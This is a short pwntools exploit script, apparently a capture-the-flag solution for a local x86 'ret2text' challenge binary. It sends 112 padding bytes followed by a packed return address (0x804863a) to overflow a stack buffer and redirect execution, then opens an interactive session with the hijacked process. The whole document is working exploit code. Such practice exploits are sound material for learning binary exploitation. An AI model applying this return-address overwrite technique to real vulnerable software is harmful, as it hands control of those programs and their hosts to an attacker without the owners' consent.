#Made by fly_autumn
#ret2text x86
from pwn import *
p = process("./ret2text")
offset = 112
ret_addr = 0x804863a
payload = b"\x00" * offset + p32(ret_addr)
p.sendline(payload)

p.interactive()
